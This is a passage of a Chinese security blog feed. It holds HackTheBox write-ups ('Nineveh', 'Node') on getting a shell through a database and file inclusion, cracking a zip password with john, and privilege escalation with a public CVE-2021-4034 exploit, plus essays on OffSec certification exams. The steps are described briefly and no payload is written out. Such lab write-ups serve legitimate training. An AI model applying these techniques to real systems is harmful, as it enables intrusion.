                ></p>
<p>弱口令试试</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.4aixr0itkge0.webp"
                     
                ></p>
<p>password123，弱口令yyds</p>
<p>搜索一下，貌似有个rce</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.6huvw70wht80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.2vf1epl7ss40.webp"
                     
                ></p>
<p>创建一个.php后缀的数据库，里面写入rce的内容，结合之前80端口的文件包含，应该可以拿shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.3jrrgcwb4lo0.webp"
                     
                ></p>
<p>由于需要带有关键字段才能包含，所以名字就取为关键字加.php</p>
<p>不能带有单引号，这里会闭合，或者采用编码形式绕过</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.2gmqqkfrn1hc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.1nsqgt0fdqqo.webp"
                     
                ></p>
<p>执行时进行解码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.534a35j2rho0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.3268tsxwpea0.webp"
                     
                ></p>
<p>回到文件包含去包含php文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.5pqyywsj9ww0.webp"
                     
                ></p>
<p>上传检测脚本，看看有没有可以提权的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.7efe8bti0qo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.24140lq7uyb.webp"
                     
                ></p>
<p>添加执行权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.3r31zrb8sv20.webp"
                     
                ></p>
<p>没发现啥，换pspy64在看看执行命令情况</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.u94km2p57xc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.2v5e0zsyo1k0.webp"
                     
                ></p>
<p>貌似有个历史漏洞，搜一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.2c3rzeig8cm.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.2joq67lisy00.webp"
                     
                ></p>
<p>在tmp目录下，root会定时运行update文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.452eir3xirw0.webp"
                     
                ></p>
<p>本地写一个反弹shell文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.20zbxvbsa2m8.webp"
                     
                ></p>
<p>顺便加个执行权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.5kjarho5wms0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Nineveh/image.7ik6a1zpe8w0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>OSCP</title>
    <url>/post/86d0e942ee7c/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSCP（Offensive Security Certified Professional）是由OffSec（也就是kali的设计以及维护官方）推出的一个渗透认证考试，要求持有者在安全的实验室环境中成功攻击和渗透各种实时机器，不设立笔试环节。</p>
<h1 id="课程内容与变化"><a href="#课程内容与变化" class="headerlink" title="课程内容与变化"></a>课程内容与变化</h1><p>OffSec官方今年3月份的时候宣布更新了PEN-200的课程和考试内容（又名PEN-200-2023，后面又改回去了），这也意味着难度可能更高。</p>
<p>主要的变化有：</p>
<ul>
<li>移出了前置的基础内容，包括：熟悉Kali Linux、命令行使用等</li>
<li>移出了缓冲区溢出内容</li>
<li>扩充了SQL注入部分</li>
<li>扩充了提权部分</li>
<li>扩充了端口转发和隧道部分</li>
<li>扩充了Active Directory部分</li>
</ul>
<p>这次的更新变化还是挺大的，以前如果在考试的时候遇见缓冲区溢出的题目，那么这将是送分题，而且每个缓冲区溢出的题目分值都不低，大多在15-20分，<del>这也意味着没法混</del>，而扩展的SQL注入、提权、以及AD域的内容则更贴切当前的行业需求吧，毕竟现在都这么卷，要是不会个内网提权啥的，都没人看你一眼。</p>
<p>而之前获得奖励积分的条件也改变了：</p>
<ul>
<li>获得30台主机的<code>proof.txt</code></li>
<li>完成每个模块中80%的练习</li>
</ul>
<p>proof.txt也就是靶场练习中的root权限flag，而模块练习则是需要每一个模块中的练习题，都完成至总进度的百分之八十，少一个都不行，但是模块练习中的一些题目则很让人难受，我记得有一题填空题，我只是忘记将它的开头字母大写而已，死活就是验证不正确。</p>
<p>总的来说，练习不难，但恶心，如果对自己有信心，就可以不用考虑去拿这10分的奖励积分。</p>
<p>新<code>labs</code>面板如下图所示</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.45u9o77hqaq0.webp"
                     
                ></p>
<p>这是在OffSec官方的discord频道中找到的</p>
<p>前三个Challenge都是一些根据课程内容设计出的练习机器，他们有的是单独的，有的是相互关联的，这个不会事先告诉你，需要你自己去领悟，如果在对一台机器进行了足够多的尝试后，还是无法找到突破口，那么就可以考虑去尝试其他机器，或许在其他机器上，你就能找到关于这台机器的一些解题思路。</p>
<p>另外，OffSec官方也是在discord有建立交流频道，如果有不会的课程练习以及靶场中的一些问题，都可以进去询问学员或者他们的导师，但都不会直接给出答案，而是一个个谜语人，答案需要自己去悟。</p>
<p>旧的<code>labs</code>总共75台机器，新的则是57台，后面三个Challenge就是往年的一些真实考题，与考试的构成是一模一样，一个域环境加三台独立的主机。</p>
<h1 id="报名"><a href="#报名" class="headerlink" title="报名"></a>报名</h1><p>报名的话需要一张支持外币的信用卡，VISA，万事达都可以，如果实在没有，可以走国内的谷安代理，而且谷安也有时会给出一些优惠，对自己水平不够自信的话也可以联系谷安进行针对性的培训，但OffSec官方是极力推荐自学通过考试的，看个人选择。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.6v582ez73as0.png"
                     
                ></p>
<p>目前有三种套餐可以选购：</p>
<ul>
<li>课程考试包：$1599，可以选择一门课程，自带90天的靶场访问时间，和一次考试的机会。</li>
<li>Learn One：$2499，可以选择一门课程，一年的靶场访问时间，两次考试机会，外带所有基础课程。</li>
<li>Learn Unlimited：$5499，一年之内可以学习所有课程，和一年之内访问靶场的时间（也是所有课程的靶场都可以访问），无限的考试机会（但不是无间隔的，第一次考试没过，需要等待一段时间后在申请第二次，间隔时间会比上面两个短一点），外带所有基础课程。</li>
</ul>
<p>由于我没有钱，所以就先只考虑报一个课程考试包，选OSCP课程。</p>
<p>联系国内的代理David报名后，转账激活账户即可开始学习。</p>
<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>报名后即开始备考，先把课程视频和课程材料看了一遍，做了部分课程练习，之后在打靶场，先做前几个Challenge，最后几个在快考试的时候去做。</p>
<p>备考练习时，最好不用习惯性的用sqlmap、Metasploit这种限制类的工具，能手动注入就手动注入，能找到其他方法就用其他方法，减少依赖性，不然考试的时候习惯性的用起来就不太好了。</p>
<p>扫描端口的时候最好多扫几遍，否则很容易漏下端口，可能漏下的就是关键性的。</p>
<p>不要执着于Web上，虽然大多数都是从Web作为突破口，但有少数是在一个偏僻的端口上运行着一个存在漏洞的服务。</p>
<p>经历了一个月多一点的学习和练习后，完成了除去Challenge 3以外的所有Challenge，也拿到了十分的奖励积分，我预约了北京时间7月17日上午十点的考试。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.18ra4zul77ts.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/20230625160420.6zl14e39nho0.webp"
                     
                ></p>
<h1 id="考试要求"><a href="#考试要求" class="headerlink" title="考试要求"></a>考试要求</h1><p>考试总时长为24小时，结束后有24小时的时间来写报告并提交，考试中全程需要开启摄像头和屏幕共享供监考，可以睡觉或暂时离开，跟考官说一下就行。</p>
<p>不能使用除考试设备之外的电子设备，包括手机、平板电脑，也不能用手机或平板当监考摄像头。</p>
<p>在考试中，不能使用商业工具（如Burpsuite Pro、Coablt Strike等）、自动化利用工具（如sqlmap）、chatgpt类问答AI、大型漏扫（如AWVS）、可能影响网络的其他工具。</p>
<p>考试中对Metasploit的使用也是有限制的，只可以对一个目标使用，且该目标不能为域环境内的主机，当申请使用后，无论成功与否，都无法在对第二个目标使用，但可以无限次的对第一个目标使用，而使用<code>msfvenom</code>和<code>exploit/multi/handler</code>是不受限制的。</p>
<p>考试总分为100分，达到70分即可通过，目标为3台独立主机和一个域环境，域环境中包括了3台主机，如果没有拿到奖励积分，要通过考试，域环境是必须要拿下的。</p>
<p>3台独立主机中，每台的普通用户权限和管理员权限分别占10分，总计60分；域环境中，总计40分，没有步骤分，也就是要么全部拿到，要么一分没有。</p>
<p>考试结束后，还需要编写考试报告，报告中需要写上你的操作步骤，以及所采用的命令，或者自己写的脚本，以及第三方的脚本工具等，和最终拿到flag的命令回显，表示成功获得权限的证明是，通过交互式shell从原始位置读取flag，webshell是不可以的，必须要截图，截图中要包括flag的内容，以及这台机器的IP地址。</p>
<p>考试报告最好是写的清晰明了一点，因为他们是根据你报告中的步骤去做一遍，如果能够复现出来，则证明考试结果有效，否则一分没有。</p>
<h1 id="考试过程"><a href="#考试过程" class="headerlink" title="考试过程"></a>考试过程</h1><p>考试时间是48小时，其实只有23小时45分钟，还是15分钟是监考用来检查摄像头和验证身份的。</p>
<p>考官会要求你打开摄像头，并将摄像头围绕你的考试环境环顾一周，并且在摄像头范围内不允许出现第二台电子设备，手机也得远离你随手可及的地方，并展示可以证明你身份的政府证件，如护照、身份证公证件。由于我不在户籍所在地，且办理护照需要一个月时间，所以我采用的是身份证公证件，只需要去当地的公证处，带上户口和身份证，和工作人员说要参加一个美国的资格认证考试，让他帮你公正一下身份证即可，如果摄像头拍的证件考官看不清，可以事先用手机拍照，然后传到电脑上，在桌面打开给考官看。</p>
<p>当一切验证完成以后，考官就会给你事先预留的邮箱中发送一封带有检测脚本的邮件，下载后在运行，并将结果粘贴至他给你的一个链接中即可，完成后，还会发送一封带有VPN连接包和考试靶机IP的邮件，下载好VPN连接包，在kali中连接即可开始考试。</p>
<p>在考试过程中，监考人员是听不到你的声音的，沟通是通过一个在线的聊天平台进行沟通。</p>
<p>在7月17日，提前十五分钟，在9：45进入监考平台，我是购买的外接USB摄像头，考官要求拿着摄像头环顾四周，以及桌底，和桌面，确认无误后就给我发送了邮件。</p>
<p>考试肯定是优先做域的，域分值为40分，不管有没有拿到奖励积分，最好是先把域做完，在将近12点的时候，找到了入口点，提权很快，没花多久，拿下第一台的管理员权限，接下来就是搭建隧道，横向移动，这一部分也很快，不知道是不是我运气好，还是抽到的题目简单，每次都能一阵见血的找到突破点，还没到下午两点就拿下了整个域。</p>
<p>和考官说了一声，就去吃了个饭，休息了会，在下午四点的时候，继续开始做独立主机，第一台独立主机拿shell也很快，但是提权部分卡了非常非常久，到最后快晚上七点的时候才找到提权方法，原本打完域给我的盲目自信现在都给我干碎了。</p>
<p>我为了求稳，还是考虑拿了10分的奖励积分，算上域的40分和独立机器的20分，我已经可以通过考试了，但是还是为了求稳，尝试在打下一台独立机器，这一台独立机器就没有那么的顺利了，光shell就拿了快两个小时，到九点的时候，才最终提权拿到root权限，这个时候已经有点累了，不想动了，之前做练习和打htb的时候，都没有过一次性做过这么长时间，脑子已经开始有点晕了，但我还是想试试最后一台机器。</p>
<p>最后一台机器我也不知道是因为我太菜了还是机器有问题，死活就是找不到突破点，最终到了11点多，实在坚持不住了，先放弃了，算下分数，已经有90分了，就索性不打了。</p>
<p>原本想着睡醒了在写报告的，还是打算现在就写，利用在线翻译，把报告翻译成英文，然后把步骤截图和flag截图全贴上，到了凌晨十二点多，写完了，在检查了一遍，没啥问题后，和考官说了一声，就提前结束了考试，我看了一下，我熬走了五个监考…哈哈哈。</p>
<p>将报告转成pdf格式，压缩，改名，上传，一步梭哈，然后倒头就睡。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/imagecd.3d56mwnkyt20.webp"
                     
                ></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>事先也了解过报告审核时间，很多都是两三天，甚至还有隔天就出结果的，我等了6天，一度认为是我的报告写的有问题，但最终还是在等了6天，4个工作日后，我在7月24日下午一点多收到了通过的邮件。</p>
<p>在此，由衷的感谢那些在我备考期间给予我帮助和鼓励的人。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.2zyl5uc86ki0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.6zdqtas811k0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>OffSec</tag>
      </tags>
  </entry>
  <entry>
    <title>OSCE3</title>
    <url>/post/fee0f83bc8bd/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>至此，我也是终于拿到了OSCE3（OffSec Certified Expert 3），从去年的3、4月份开始备考OSCP开始，到现在，将近一年左右的时间（<del>虽然考完OSCP后，很多时间都是在摸鱼</del>）。</p>
<p>其实很早以前就幻想过，收到OSCE3邮件的时候，心情激动，但当我真的收到的时候，却没有想象中的那么兴奋，反而有一点平淡，这可能就是得不到的永远在骚动。</p>
<p>回想起这一整年的备考过程，感触颇多，备考路上碰到过很多很多问题，也走了很多很多弯路，路上也遇到了很多一起同行的师傅，互相帮助解决问题，非常非常感谢这些师傅的帮助，其中有一位师傅我要特别感谢，由于隐私问题，我就不说这位师傅是谁了，每当我有不会的，有疑问的，这位师傅都会一针见血的帮我指出问题所在，也让我少走了很多的弯路，每次与师傅聊完都是收获满满。</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这也算是达成了一个目标吧，虽然取得了OSCE3认证，但不足的地方还是很多很多，如果不能坚持学习，终究也是会被淘汰的。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.5xan5o95xp.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.3d4st1a0w5.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>OffSec</tag>
      </tags>
  </entry>
  <entry>
    <title>Node - HackTheBox</title>
    <url>/post/13258ccc923a/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.76nk6k2536c0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.440zj77j0ts0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.2vw2n4m8yeo0.webp"
                     
                ></p>
<p>http服务开放在3000端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.3a6cmrdibiq0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.5flrnu0n4dk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.1sr1xc5pgy0w.webp"
                     
                ></p>
<p>主页有登录框</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.3a93vtlkxsu0.webp"
                     
                ></p>
<p>试试弱口令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.4mu0x34sfx80.webp"
                     
                ></p>
<p>在试试主页这几个名字</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.5cm5atc3d4c0.webp"
                     
                ></p>
<p>扫个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.4i8eq5szz440.webp"
                     
                ></p>
<p>出现报错，修改一下语句</p>
<p><code>gobuster dir -u &quot;http://10.10.10.58:3000/&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -b 200</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.55wf1v15l4k0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.1dh4r4cxr0hs.webp"
                     
                ></p>
<p>目录扫描结果也毫无利用价值</p>
<p>都没用，想到靶机名字Node，看看js文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.6bjmptecvyo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.49kva6gskqu0.webp"
                     
                ></p>
<p>貌似是用户和加密后的密码，第一个貌似是管理员，解密一下密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.3bb4514apgi0.webp"
                     
                ></p>
<p>cmd5可以解密</p>
<p>登陆后有一个下载地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.5p4f8dbdrmg0.webp"
                     
                ></p>
<p>我这里不知道为什么，死活下载不了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.44om9fzkvuk0.webp"
                     
                ></p>
<p>简单的说这个文件是个二进制文件，利用base64解码后输出到一个新文件，新文件类型为zip压缩类型，将文件名修改为xx.zip，之后解压，但是需要密码，可以使用zip2john进行爆破，<code>zip2john xx.zip</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.3rr2wfu6bbo0.webp"
                     
                ></p>
<p>会输出这么一段字符串，保存至一个文件，在利用john进行爆破，<code>john 文件名 -w /usr/share/wordlists/rockyou.txt</code>，解压缩之后会输出一个var文件夹，进入后在&#x2F;var&#x2F;www&#x2F;app.js中可以找到一个mark用户ssh连接的密码，采用ssh连接后可获得user权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.670dlijrtbs0.webp"
                     
                ></p>
<p>利用linpeas检测一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.2tpzowwrir40.webp"
                     
                ></p>
<p>发现一个CVE，年份还挺接近，可以试试</p>
<p><code>https://github.com/arthepsy/CVE-2021-4034</code></p>
<p>先下载到攻击机，在让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.4e0oc5jaepo0.webp"
                     
                ></p>
<p>添加执行权限，在编译</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.5tpg5n0vejk0.webp"
                     
                ></p>
<p>添加执行权限，运行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Node/image.478z70i0h3e0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>OSED</title>
    <url>/post/a2a98c7236bd/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSED也称EXP-301(Windows User Mode Exploit Development)，这是一门Windows平台漏洞利用的课程，简单来说就是Windows Pwn。</p>
<p>EXP-301的主要内容是Windows下32位的漏洞利用，这也是令很多人为之诟病的地方，但这门课并不是进阶课程，只是一个入门级的课程，所以用32位其实也可以，进阶的课程可以参考Exploit Development，也就是OSEE-EXP-401。</p>
<p>官方建议学习这门课程的前置技能要求为：</p>
<ul>
<li>熟悉调试器</li>
<li>熟悉32位漏洞利用的基本概念</li>
<li>能够熟练编写Python3代码</li>
<li>能够基本阅读和理解C代码</li>
<li>能够基本阅读和理解基础的汇编代码</li>
</ul>
<p>如果暂时没有掌握这些前置要求的话，可以考虑学习一下exp-100，这是一门简单讲解汇编语言，以及Windbg、IDA-Free利用的课程。</p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>OSED考试时间同样是48小时，需要提交考试报告。考试总共三题，前面两题各为30分，最后一题40分，拿到60分即可通过。</p>
<p>考试中不允许使用GPT之类的AI辅助工具，而且必须使用IDA-Free和Windbg来完成题目，这一点就让很多人不适应，相比较与IDA-Pro、x32dbg这类工具来讲，规定使用的IDA-Free和Windbg很不方便，但官方解释是为了保证考试过程的相对公平。</p>
<p>考试中所写的利用脚本必须是为python3格式，可以使用Metasploit社区版来辅助生成shellcode，并且可利用的脚本要作为单独的文件与考试报告一同打包为一个压缩包，并不是将脚本放置在报告pdf中。</p>
<p>如果只算通过的话，前面两题做出来就可以通过考试，但是必须要完完整整的做出，并且拿到shell，步骤不算分，但缺少步骤会扣分。</p>
<p>与OSWE一样，OSED考试也不允许将考试文件下载到本地，除非是第三题，考试说明允许下载到本地，但也要求在考试结束时删除文件。</p>
<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>相对于OSEP、OSWE来说，OSED的课程内容相对较少，但浓缩的就是精华，写的少，不代表内容少。</p>
<p>在这期间，也看过不少之前通过OSED的师傅写的记录，一般来说，题目分为3个类型：</p>
<ul>
<li>Custome Shellcode，会指定你需要通过哪个函数达成什么效果</li>
<li>给Crash PoC的DEP Bypass，这部分是考ROP，重点中的重点</li>
<li>对逆向能力要求高的压轴题</li>
</ul>
<p>最后一题我看记录做出来的师傅不多，但只做前两题也足以通过考试。</p>
<p>距离OSCE3就差最后一门了，也是比较的心急，基本上是OSWE知道结果后的当天晚上就开始准备了，先看了一部分exp-100的内容，大概了解了下汇编语言以及汇编指令，随即就开始看教材。</p>
<p>目标是先保底能做出前两题，如果时间有多，可以尝试做做第三题，所以重点就放在了看前两题的相关章节上。</p>
<p>OSED总共有三个challenge，我一个没做…，哈哈，在看完教材后，我找了很多课外练习题来做。</p>
<p>自定义shellcode：</p>
<ul>
<li>CreateProcess执行calc.exe</li>
<li>WinExec执行calc.exe</li>
<li>CreateServiceA创建一个服务</li>
<li>GetUserNameA + MessageboxA 弹出”Hello 用户名”</li>
<li>GetUserNameW + MessageboxW 弹出”主机名 用户名”</li>
</ul>
<p>ROP：</p>
<ul>
<li>github.com&#x2F;xct&#x2F;vulnbins</li>
<li>exploits&#x2F;50472 10-Strike Network Inventory Explorer</li>
<li>exploits&#x2F;17665 D.R. Software Audio Converter 8.1</li>
<li>exploits&#x2F;44522 exploits&#x2F;47411 Easy File Sharing Web Server 7.2</li>
<li>exploits&#x2F;46269 Faleemi Desktop Software 1.8</li>
<li>exploits&#x2F;50650 vuplayer 2.49</li>
<li>exploits&#x2F;43156 VX Search 10.2.14</li>
</ul>
<p>其实ROP有很多都下载不到对应版本了，这就只能在去找找其他师傅自己编写的程序练习。</p>
<p>后续的时间只有端午节有假了，如果还要等的话就要等9月10月的中秋国庆了，想着不管咋样，先预约一波端午节的考试。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/20240523231746.9gwf59lkl4.webp"
                     
                ></p>
<h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>这绝对是我目前经历过的最难最难最难的OffSec考试。</p>
<p>这次考试将折磨发挥的淋漓尽致，由于我之前并没有任何有关这方面的知识学习，我拿到题目和考试要求后，我坐在那里发呆了半个小时，不断地回忆之前做练习时候的那种状态。</p>
<p>第一题是DEP Bypass，也就是ROP，这一题我没有开始就做，选择先开始第二题，自定义shellcode，这一题我从开考开始计算，十二个小时后我才成功解决，随后休息了一段时间，开始尝试第一题，这一试就出问题了，开头就被卡住，卡了我三四个小时，后面到凌晨的三点多受不了了，和监考说去睡了会，早上七点多又起来继续，这一干直接干到了第二天的早上六七点，期间想放弃的念头不断升起，甚至于我都已经想和监考说结束考试了，但那句话还是在消息框没有发送出去。</p>
<p>早上六七点终于解决了ROP的题目，将脚本完善完善，运行后拿到目标机器的反弹shell，就马不停蹄的将报告也写好，写完之后和监考说了结束考试，提交了报告，立马倒头就睡，一觉睡到晚上六点多。</p>
<p>原本我还以为结果要等第二天，没想到这次效率非常之快，我提交报告差不多是上午的八九点，晚上十一点多的时候就在预约考试页面看到了通过通知，还没有收到邮件。</p>
<p>在第二天的上午，我收到了OSED的通过邮件，以及OSCE3的邮件，有个很神奇的地方就是，OSCE3的邮件来的比OSED的邮件还要快。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.7egmh7osy7.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.wike43sbz.webp"
                     
                ></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这次还是有点勉强了，差一点就挂了，还是因为只差最后一门，有点心急，学习时间不太够。</p>
]]></content>
      <tags>
        <tag>OffSec</tag>
      </tags>
  </entry>
  <entry>
    <title>OSDA</title>
    <url>/post/a3df3b1f1d78/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSDA也就是SOC-200(OffSec Foundational Security Operations and Defensive Analysis)，是Offsec推出的一个面向SOC分析师的蓝队认证，更侧重于取证方面。</p>
<p>OSDA是教学使用ELK，这相对来讲稍有点老旧，真实的环境中也基本不会使用ELK了，重点还是教学一些思路上的东西。</p>
